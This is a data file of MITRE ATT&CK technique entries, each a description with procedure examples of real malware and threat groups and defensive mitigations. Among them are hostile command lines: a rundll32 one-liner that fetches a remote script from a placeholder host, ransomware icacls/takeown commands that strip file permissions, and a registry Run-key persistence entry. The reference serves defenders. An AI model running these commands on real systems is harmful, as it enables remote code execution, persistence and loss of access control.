{"text": " Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.", "idx": "https://attack.mitre.org/techniques/T1039", "title": "Data from Network Shared Drive", "entity": "Data from Network Shared Drive", "entity_type": "techniques", "entity_context": ["Gamaredon Group malware has collected Microsoft Office documents from mapped network drives.", "Chimera has collected data of interest from network shares.", "Ramsay can collect data from network drives and stage it for exfiltration.\t", "Fox Kitten has searched network shares to access sensitive documents.", "When it first starts, BADNEWS crawls the victim's mapped drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.", "Sowbug extracted Word documents from a file server on a victim network.", "menuPass has collected data from remote systems by mounting network shares with <code>net use</code> and using Robocopy to transfer data.", "Egregor can collect any files found in the enumerated drivers before sending it to its C2 channel. ", "CosmicDuke steals user files from network shared drives with file extensions and keywords that match a predefined list.", "APT28 has collected files from network shared drives.", "BRONZE BUTLER has exfiltrated files stolen from file shares."], "is_subtechnique": false}
{"text": " Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.). Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018) Adversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).", "idx": "https://attack.mitre.org/techniques/T1222/001", "title": "Windows File and Directory Permissions Modification", "entity": "Windows File and Directory Permissions Modification", "entity_type": "techniques", "entity_context": ["Grandoreiro can modify the binary ACL to prevent security tools from running.", "Ryuk can launch <code>icacls <path> /grant Everyone:F /T /C /Q</code> to delete every access-based restrictions on files and directories.", "Wizard Spider has used the icacls command to modify access control to backup servers, providing them with full control of all the system folders.", "WannaCry uses <code>attrib +h</code> and <code>icacls . /grant Everyone:F /T /C /Q</code> to make some of its files hidden and grant all users full access controls.", "BitPaymer can use <code>icacls /reset</code> and <code>takeown /F</code> to reset a targeted executable's permissions and then take ownership.", "Ensure critical system files as well as those known to be abused by adversaries have restrictive permissions and are owned by an appropriately privileged account, especially if access is not required by users nor will inhibit system functionality.", "JPIN can use the command-line utility cacls.exe to change file permissions.", "WastedLocker has a command to take ownership of a file and reset the ACL permissions using the <code>takeown.exe /F filepath</code> command. ", "Applying more restrictive permissions to files and directories could prevent adversaries from modifying the access control lists."], "is_subtechnique": true}
{"text": " Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Multiple ways of delivering exploit code to a browser exist, including: * A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting. * Malicious ads are paid for and served through legitimate ad providers. * Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content). Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise) Typical drive-by compromise process: 1. A user visits a website that is used to host the adversary controlled content. 2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. * The user may be required to assist in this process by enabling scripting", "idx": "https://attack.mitre.org/techniques/T1189", "title": "Drive-by Compromise", "entity": "Drive-by Compromise", "entity_type": "techniques", "entity_context": ["For malicious code served up through ads, adblockers can help prevent that code from executing in the first place.\n\nScript blocking extensions can help prevent the execution of JavaScript that may commonly be used during the exploitation process.", "Transparent Tribe has used websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools.", "Grandoreiro has used compromised websites and Google Ads to bait victims into downloading its installer.", "BRONZE BUTLER compromised three Japanese websites using a Flash exploit to perform watering hole attacks.", "Ensure all browsers and plugins kept updated can help prevent the exploit phase of this technique. Use modern browsers with security features turned on.", "KARAE was distributed through torrent file-sharing websites to South Korean victims, using a YouTube video downloader application as a lure.", "APT19 performed a watering hole attack on forbes.com in 2014 to compromise targets.", "Leviathan has infected victims using watering holes.", "Patchwork has used watering holes to deliver files with exploits to initial victims.", "Turla has infected victims using watering holes.", "RTM has distributed its malware via the RIG and SUNDOWN exploit kits, as well as online advertising network <code>Yandex.Direct</code>.", "PLATINUM has sometimes used drive-by attacks against vulnerable browser plugins.", "Machete has distributed Machete through a fake blog website.", "APT37 has used strategic web compromises, particularly of South Korean websites, to distribute malware. The group has also used torrent file-sharing sites to more indiscriminately disseminate malware to victims. As part of their compromises, the group has used a Javascript based profiler called RICECURRY to profile a victim's web browser and deliver malicious code accordingly.", "Lazarus Group delivered RATANKBA to victims via a compromised legitimate website.", "Dragonfly 2.0 compromised legitimate organizations' websites to create watering holes to compromise victims.", "Elderwood has delivered zero-day exploits and malware to victims by injecting malicious code into specific public Web pages visited by targets within a particular sector.", "REvil has infected victim machines through compromised websites and exploit kits.", "Threat Group-3390 has extensively used strategic web compromises to target victims.", "Windshift has used compromised websites to register custom URL schemes on a remote system.", "Andariel has used watering hole attacks, often with zero-day exploits, to gain initial access to victims within a specific IP range.", "Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior.  Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring.  Many of these protections depend on the architecture and target application binary for compatibility.", "LoudMiner is typically bundled with pirated copies of Virtual Studio Technology (VST) for Windows and macOS.", "Bad Rabbit spread through watering holes on popular sites by injecting JavaScript into the HTML body or a <code>.js</code> file.", "Leafminer has infected victims using watering holes.", "APT38 has conducted watering holes schemes to gain initial access to victims.", "Bundlore has been spread through malicious advertisements on websites.", "Browser sandboxes can be used to mitigate some of the impact of exploitation, but sandbox escapes may still exist.\n\nOther types of virtualization and application microsegmentation may also mitigate the impact of client-side exploitation. The risks of additional exploits and weaknesses in implementation may still exist for these types of systems.", "Dragonfly has compromised targets via strategic web compromise (SWC) utilizing a custom exploit kit.", "APT32 has infected victims by tricking them into visiting compromised watering hole websites.", "Windigo has distributed Windows malware via drive-by downloads.", "POORAIM has been delivered through compromised sites acting as watering holes.", "Darkhotel used embedded iframes on hotel login portals to redirect selected victims to download malware.", "PROMETHIUM has used watering hole attacks to deliver malicious versions of legitimate installers.", "Dark Caracal leveraged a watering hole to serve up malicious code."], "is_subtechnique": false}
{"text": " Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.", "idx": "https://attack.mitre.org/techniques/T1098", "title": "Account Manipulation", "entity": "Account Manipulation", "entity_type": "techniques", "entity_context": ["Dragonfly 2.0 added newly created accounts to the administrators group to maintain elevated access.", "The Mimikatz credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality. The <code>LSADUMP::ChangeNTLM</code> and <code>LSADUMP::SetNTLM</code> modules can also manipulate the password hash of an account without knowing the clear text value.", "Use multi-factor authentication for user and privileged accounts.", "Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.", "Protect domain controllers by ensuring proper security configuration for critical servers to limit access by potentially unnecessary protocols and services, such as SMB file sharing.", "Lazarus Group malware WhiskeyDelta-Two contains a function that attempts to rename the administrator’s account.", "SMOKEDHAM has added created user accounts to local Admin groups.", "Configure access controls and firewalls to limit access to critical systems and domain controllers. Most cloud environments support separate virtual private cloud (VPC) instances that enable further segmentation of cloud systems.", "Sandworm Team used the <code>sp_addlinkedsrvlogin</code> command in MS-SQL to create a link between a created account and other servers in the network.", "APT3 has been known to add created accounts to local admin groups to maintain elevated access.", "Calisto adds permissions and remote logins to all users."], "is_subtechnique": false}
{"text": " Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security) Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).", "idx": "https://attack.mitre.org/techniques/T1053", "title": "Scheduled Task/Job", "entity": "Scheduled Task/Job", "entity_type": "techniques", "entity_context": ["Remsec schedules the execution one of its modules by creating a new scheduler task.", "Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be can be configured through GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority. ", "Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl</code>. The setting can be configured through GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. ", "Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. ", "Lokibot's second stage DLL has set a timer using “timeSetEvent” to schedule its next execution.", "\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting  tools, like AppLocker,   or Software Restriction Policies  where appropriate. ", "Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems."], "is_subtechnique": false}
{"text": " Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.", "idx": "https://attack.mitre.org/techniques/T1555", "title": "Credentials from Password Stores", "entity": "Credentials from Password Stores", "entity_type": "techniques", "entity_context": ["Carberp's passw.plug plugin can gather account information from multiple instant messaging, email, and social media services, as well as FTP, VNC, and VPN clients.", "Astaroth uses an external software known as NetPass to recover passwords. ", "PinchDuke steals credentials from compromised hosts. PinchDuke's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by PinchDuke include ones associated with many sources such as The Bat!, Yahoo!, Mail.ru, Passport.Net, Google Talk, and Microsoft Outlook.", "Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the credential vault and DPAPI.\t", "PLEAD has the ability to steal saved passwords from Microsoft Outlook.", "The password for the user's login keychain can be changed from the user's login password. This increases the complexity for an adversary because they need to know an additional password.\n\nOrganizations may consider weighing the risk of storing credentials in password stores and web browsers. If system, software, or web browser credential disclosure is a significant concern, technical controls, policy, and user training may be used to prevent storage of credentials in improper locations.", "FIN6 has used the Stealer One credential stealer to target e-mail and file transfer utilities including FTP.", "CosmicDuke collects user credentials, including passwords, for various programs including popular instant messaging applications and email clients as well as WLAN keys.", "APT29 used account credentials they obtained to attempt access to Group Managed Service Account (gMSA) passwords.", "A module in Prikormka collects passwords stored in applications installed on the victim.", "Matryoshka is capable of stealing Outlook passwords.", "NETWIRE can retrieve passwords from messaging and mail client applications.", "APT39 has used the Smartftp Password Decryptor tool to decrypt FTP passwords.", "MuddyWater has performed credential dumping with LaZagne and other tools, including by dumping passwords saved in victim email.", "Evilnum can collect email credentials from victims.", "Lokibot has stolen credentials from multiple applications and data sources including Windows OS credentials, email clients, FTP, and SFTP clients.", "Agent Tesla has the ability to steal credentials from FTP clients and wireless profiles.", "OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.", "Leafminer used several tools for retrieving login and password information, including LaZagne.", "KGH_SPY can collect credentials from WINSCP.", "OLDBAIT collects credentials from several email clients.", "QuasarRAT can obtain passwords from common FTP clients.", "Pupy can use Lazagne for harvesting credentials.", "APT33 has used a variety of publicly available tools like LaZagne to gather credentials.", "Stealth Falcon malware gathers passwords from multiple sources, including Windows Credential Vault and Outlook.", "LaZagne can obtain credentials from databases, mail, and WiFi across multiple platforms."], "is_subtechnique": false}
{"text": " Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>). Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL) Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code> This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion) Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll)", "idx": "https://attack.mitre.org/techniques/T1218/011", "title": "Rundll32", "entity": "Rundll32", "entity_type": "techniques", "entity_context": ["BLINDINGCAN has used Rundll32 to load a malicious DLL.", "Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass application control.", "A gh0st RAT variant has used rundll32 for execution.", "Ragnar Locker has used rundll32.exe to execute components of VirtualBox.", "APT28 executed CHOPSTICK by using rundll32 commands such as <code>rundll32.exe “C:\\Windows\\twain_64.dll”</code>. APT28 also executed a .dll for a first stage dropper using rundll32.exe. An APT28 loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.", "APT29 has used <code>Rundll32.exe</code> to execute payloads.", "Matryoshka uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.", "SUNBURST used Rundll32 to execute payloads. ", "Sakula calls cmd.exe to run various DLL files via rundll32.", "Egregor has used rundll32 during execution.", "StreamEx uses rundll32 to call an exported function.", "Sibot has executed downloaded DLLs with <code>rundll32.exe</code>.", "QakBot can use Rundll32.exe to enable C2 communication.", "MuddyWater has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.", "Gamaredon Group malware has used rundll32 to launch additional malicious components.", "After copying itself to a DLL file, a variant of Elise calls the DLL file using rundll32.exe.", "The Winnti for Windows installer loads a DLL using rundll32.", "Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe.\t", "USBferry can execute rundll32.exe in memory to avoid detection.\t", "Bisonal uses rundll32.exe to execute as part of the Registry Run key it adds: <code>HKEY_CURRENT_USER \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\”vert” = “rundll32.exe c:\\windows\\temp\\pvcu.dll , Qszdez”</code>.", "HAFNIUM has used <code>rundll32</code> to load malicious DLLs.", "Prikormka uses rundll32.exe to load its DLL.", "Pteranodon executes functions using rundll32.exe.", "APT19 configured its payload to inject into the rundll32.exe.", "EnvyScout has the ability to proxy execution of malicious files with Rundll32.", "BoomBox can use RunDLL32 for execution.", "APT3 has a tool that can run DLLs.", "NativeZone has used rundll32 to execute a malicious DLL.", "Attor's installer plugin can schedule rundll32.exe to load the dispatcher.", "APT41 has used rundll32.exe to execute a loader.", "Koadic can use Rundll32 to execute additional payloads.", "Rundll32.exe is used as a way of executing Flame at the command-line.", "PowerDuke uses rundll32.exe to load.", "Carbanak installs VNC server software that executes through rundll32.", "PUNCHBUGGY can load a DLL using Rundll32.", "ADVSTORESHELL has used rundll32.exe in a Registry value to establish persistence.", "CopyKittens uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.", "RTM runs its core DLL file using rundll32.exe.", "CORESHELL is installed via execution of rundll32 with an export named \"init\" or \"InitW.\"", "TA505 has leveraged <code>rundll32.exe</code> to execute malicious DLLs.", "NotPetya uses <code>rundll32.exe</code> to install itself on remote systems when accessed via PsExec or <code>wmic</code>.", "TA551 has used rundll32.exe to load malicious DLLs.", "EVILNUM can execute commands and scripts through rundll32. ", "The CozyCar dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main CozyCar component.", "Briba uses rundll32 within Registry Run Keys / Startup Folder entries to execute malicious DLLs.", "ZxShell has used rundll32.exe to execute other DLLs and named pipes. ", "Kwampirs uses rundll32.exe in a Registry value added to establish persistence.", "FELIXROOT uses Rundll32 for executing the dropper program.", "DDKONG uses Rundll32 to ensure only a single instance of itself is running at once.", "Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using rundll32.exe.", "KONNI has used Rundll32 to execute its loader for privilege escalation purposes.", "NOKKI has used rundll32 for execution.", "PolyglotDuke can be executed using rundll32.exe.", "InvisiMole has used rundll32.exe for execution.", "APT32 malware has used rundll32.exe to execute an initial infection process.", "Mosquito's launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.", "APT38 has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools.", "MegaCortex has used <code>rundll32.exe</code> to load a DLL for file encryption.", "GreyEnergy uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\\SYSTEM).", "Variants of Emissary have used rundll32.exe in Registry values added to establish persistence.", "ServHelper contains a module for downloading and executing DLLs that leverages <code>rundll32.exe</code>.", "Comnie uses Rundll32 to load a malicious DLL.", "JHUHUGIT is executed using rundll32.exe.", "Cobalt Strike can use rundll32.exe to load DLL from the command line.", "FatDuke can execute via rundll32.", "Bad Rabbit has used rundll32 to launch a malicious DLL as <code>C:Windowsinfpub.dat</code>."], "is_subtechnique": true}
{"text": " Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. In Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.", "idx": "https://attack.mitre.org/techniques/T1057", "title": "Process Discovery", "entity": "Process Discovery", "entity_type": "techniques", "entity_context": ["Bisonal can obtain a list of running processes on the victim’s machine.", "StreamEx has the ability to enumerate processes.", "Mosquito runs <code>tasklist</code> to obtain running processes.", "KEYMARBLE can obtain a list of running processes on the system.", "TrickBot uses module networkDll for process list discovery.", "Nebulae can enumerate processes on a target system.", "PowerStallion has been used to monitor process lists.", "Seasalt has a command to perform a process listing.", "Higaisa’s shellcode attempted to find the process ID of the current process.", "Andariel has used <code>tasklist</code> to enumerate processes and find a specific string.", "APT1 gathered a list of running processes on the system using <code>tasklist /v</code>.", "BabyShark has executed the <code>tasklist</code> command.\t", "MoonWind has a command to return a list of running processes.", "Machete has a component to check for running processes to look for web browsers. ", "Valak has the ability to enumerate running processes on a compromised host.", "Avaddon has collected information about running processes.", "APT37's Freenki malware lists running processes using the Microsoft Windows API.", "KONNI has used tasklist.exe to get a snapshot of the current processes’ state of the target machine.", "PowerDuke has a command to list the victim's processes.", "Waterbear can identify the process for a specific security product.", "Mustang Panda has used <code>tasklist /v</code> to determine active process information.\t", "Cannon can obtain a list of processes running on the system.", "Pupy can list the running processes and get the process ID and parent process’s ID.", "PowerShower has the ability to deploy a reconnaissance module to retrieve a list of the active processes.", "Crimson contains a command to list processes.\t ", "UBoatRAT can list running processes on the system.", "DarkComet can list active processes running on the victim’s machine.", "Rising Sun can enumerate all running processes and process information on an infected machine.\t", "TAINTEDSCRIBE can execute <code>ProcessList</code> for process discovery.", "Carberp has collected a list of running processes.", "Trojan.Karagany can use Tasklist to collect a list of running tasks.", "ADVSTORESHELL can list running processes.", "Stealth Falcon malware gathers a list of running processes.", "Windshift has used malware to enumerate active processes.", "MobileOrder has a command to upload information about all running processes to its C2 server.", "GeminiDuke collects information on running processes and environment variables from the victim.", "Azorult can collect a list of running processes by calling CreateToolhelp32Snapshot.", "BACKSPACE may collect information about running processes.", "BBSRAT can list running processes.", "PlugX has a module to list the processes running on a machine.", "Javali can monitor processes for open browsers and custom banking applications.", "ROKRAT lists the current running processes on the system.", "Aria-body has the ability to enumerate loaded modules for a process..", "XAgentOSX contains the getProcessList function to run <code>ps aux</code> to get running processes.", "EKANS looks for processes from a hard-coded list.", "Kwampirs collects a list of running services with the command <code>tasklist /v</code>.", "FrameworkPOS can enumerate and exclude selected processes on a compromised host to speed execution of memory scraping.", "IronNetInjector can identify processes via C# methods such as <code>GetProcessesByName</code> and running Tasklist with the Python <code>os.popen</code> function.", "P8RAT can check for specific processes associated with virtual environments.", "Ke3chang performs process discovery using <code>tasklist</code> commands.", "LoudMiner used the <code>ps</code> command to monitor the running processes on the system.\t", "OilRig has run <code>tasklist</code> on a victim's machine.", "Epic uses the <code>tasklist /v</code> command to obtain a list of processes.", "Hydraq creates a backdoor through which remote attackers can monitor processes.", "BLACKCOFFEE has the capability to discover processes.", "Chimera has used <code>tasklist</code> to enumerate processes.", "InvisiMole can obtain a list of running processes.", "RogueRobin checks the running processes for evidence it may be running in a sandbox environment. It specifically enumerates processes for Wireshark and Sysinternals.", "Backdoor.Oldrea collects information about running processes.", "NETEAGLE can send process listings over the C2 channel.", "TeamTNT searches for rival malware and removes them if found.", "TajMahal has the ability to identify running processes and associated plugins on an infected host.", "ELMER is capable of performing process listings.", "Cardinal RAT contains watchdog functionality that ensures its process is always running, else spawns a new instance.", "Derusbi collects current and parent process IDs.", "BISCUIT has a command to enumerate running processes and identify their owners.", "Inception has used a reconnaissance module to identify active processes and other associated loaded modules.", "Cobalt Strike's Beacon payload can collect information on process details.", "Doki has searched for the current process’s PID.", "Fysbis can collect information about running processes. ", "NavRAT uses <code>tasklist /v</code> to check running processes.", "ZxShell has a command, ps, to obtain a listing of processes on the system. ", "Darkhotel malware can collect a list of running processes on a system.", "SUNSPOT monitored running processes for instances of <code>MsBuild.exe</code> by hashing the name of each running process and comparing it to the corresponding value <code>0x53D525</code>. It also extracted command-line arguments and individual arguments from the running <code>MsBuild.exe</code> process to identify the directory path of the Orion software Visual Studio solution.", "POORAIM can enumerate processes.", "Bad Rabbit can enumerate all running processes to compare hashes.", "Rocke can detect a running process's PID on the infected machine.\t", "Empire can find information about processes running on local and remote systems.", "Pillowmint can iterate through running processes every six seconds collecting a list of processes to capture from later.\t", "Remsec can obtain a process list from the victim.", "ThiefQuest obtains a list of running processes using the function <code>kill_unwanted</code>.", "Ixeshe can list running processes.", "Frankenstein has enumerated hosts, looking to obtain a list of all currently running processes.", "QakBot has the ability to check running processes.", "Tasklist can be used to discover processes running on a system.", "Elise enumerates processes via the <code>tasklist</code> command.", "FELIXROOT collects a list of running processes.", "Agent Tesla can list the current running processes on the system.", "FinFisher checks its parent process for indications that it is running in a sandbox setup.", "The discovery modules used with Duqu can collect information on process details.", "Linfo creates a backdoor through which remote attackers can retrieve a list of running processes.", "Volgmer can gather a list of processes.", "down_new has the ability to list running processes on a compromised host.", "Turla surveys a system upon check-in to discover running processes using the <code>tasklist /v</code> command. Turla RPC backdoors have also enumerated processes associated with specific open ports or named pipes.", "AppleSeed can enumerate the current process on a compromised host.", "SombRAT can use the <code>getprocesslist</code> command to enumerate processes on a compromised host.", "Carbon can list the processes on the victim’s machine.", "BlackEnergy has gathered a process list by using Tasklist.exe.", "Winnti Group looked for a specific process running on infected servers.", "EvilBunny has used EnumProcesses() to identify how many process are running in the environment.", "Kasidet has the ability to search for a given process name in processes currently running in the system.", "APT3 has a tool that can list out currently running processes.", "Avenger has the ability to use Tasklist to identify running processes.", "Goopy has checked for the Google Updater process to ensure Goopy was loaded properly.", "Gold Dragon checks the running processes on the victim’s machine.", "NETWIRE can discover processes on compromised hosts.", "ShadowPad has collected the PID of a malicious process.", "Imminent Monitor has a \"Process Watcher\" feature to monitor processes in case the client ever crashes or gets closed.", "HotCroissant has the ability to list running processes on the infected host.", "Get2 has the ability to identify running processes on an infected host.", "WinMM sets a WH_CBT Windows hook to collect information on process creation.", "PoetRAT has the ability to list all running processes.", "Brave Prince lists the running processes.", "jRAT can query and kill system processes.", "POWRUNER may collect process information by running <code>tasklist</code> on a victim.", "Zebrocy uses the <code>tasklist</code> and <code>wmic process get Capture, ExecutablePath</code> commands to gather the processes running on the system.", "Helminth has used Tasklist to get information on processes.", "Kinsing has used ps to list processes.", "Tropic Trooper is capable of enumerating the running processes on the system using <code>pslist</code>.", "gh0st RAT has the capability to list processes.", "APT38 leveraged Sysmon to understand the processes, services in the organization.", "PLAINTEE performs the <code>tasklist</code> command to list running processes.", "Conti can enumerate through all open processes to search for any that have the string “sql” in their process name.", "JPIN can list running processes.", "Maze has gathered all of the running system processes.\t", "APT29 has used multiple command-line utilities to enumerate running processes.", "BLUELIGHT can collect process filenames and SID authority level.", "Orz can gather a process list from the victim.", "4H RAT has the capability to obtain a listing of running processes (including loaded modules).", "iKitten lists the current processes running.", "USBferry can use <code>tasklist</code> to gather information about the process running on the infected system.\t", "FruitFly has the ability to list processes on the system.", "Socksbot can list all running processes.", "Operation Wocao has collected a list of running processes on the infected system.", "Comnie uses the <code>tasklist</code> to view running processes on the victim’s machine.", "Dacls can collect data on running and parent processes.", "Pasam creates a backdoor through which remote attackers can retrieve lists of running processes.", "OceanSalt can collect the name and ID for every process running on the system.", "Babuk has the ability to check running processes on a targeted system.", "MarkiRAT can search for different processes on a system.", "Honeybee gathers a list of processes using the <code>tasklist</code> command and then is sent back to the control server.", "SUNBURST collected a list of process names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists.", "RATANKBA lists the system’s processes.", "Skidmap has monitored critical processes to ensure resiliency. ", "Astaroth searches for different processes on the system.", "Bonadan can use the <code>ps</code> command to discover other cryptocurrency miners active on the system.", "GravityRAT lists the running processes on the system.", "Caterpillar WebShell can gather a list of processes running on the machine. ", "POWERSTATS has used <code>get_tasklist</code> to discover processes on the compromised host.", "Bundlore has used the <code>ps</code> command to list processes.", "FatDuke can list running processes on the localhost.", "Ursnif has gathered information about running processes.", "Taidoor can use <code>GetCurrentProcessId</code> for process discovery.", "DustySky collects information about running processes from victims.", "SLOTHFULMEDIA has enumerated processes by ID, name, or privileges. ", "Sidewinder has used tools to identify running processes on the victim's machine.", "Clop can enumerate all processes on the victim's machine.", "SynAck enumerates all running processes.", "HALFBAKED can obtain information about running processes on the victim.", "Lucifer can identify the process that owns remote connections.", "ChChes collects its process identifier (PID) on the victim.", "RainyDay can enumerate processes on a target system.", "Dtrack’s dropper can list all running processes.", "After compromising a victim, Poseidon Group lists all running processes.", "PLEAD has the ability to list processes on the compromised host.", "PowerSploit's <code>Get-ProcessTokenPrivilege</code> Privesc-PowerUp module can enumerate privileges for a given process.", "Several Lazarus Group malware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used by Lazarus Group also gathers process times.", "KillDisk has called <code>GetCurrentProcess</code>.", "SHOTPUT has a command to obtain a process listing.", "StrongPity can determine if a user is logged in by checking to see if explorer.exe is running.", "Metamorfo has performed process name checks and has monitored applications. ", "Cuba can enumerate processes running on a victim's machine.", "Carbanak lists running processes.", "Deep Panda uses the Microsoft Tasklist utility to list processes running on systems.", "ShimRatReporter listed all running processes on the machine.", "An APT28 loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.", "Sykipot may gather a list of running processes by running <code>tasklist /v</code>.", "Final1stspy obtains a list of running processes.", "Bankshot identifies processes and collects the process ids.", "The OsInfo function in Komplex collects a running process list.", "Kazuar obtains a list of running processes through WMI querying and the <code>ps</code> command.", "SYSCON has the ability to use Tasklist to 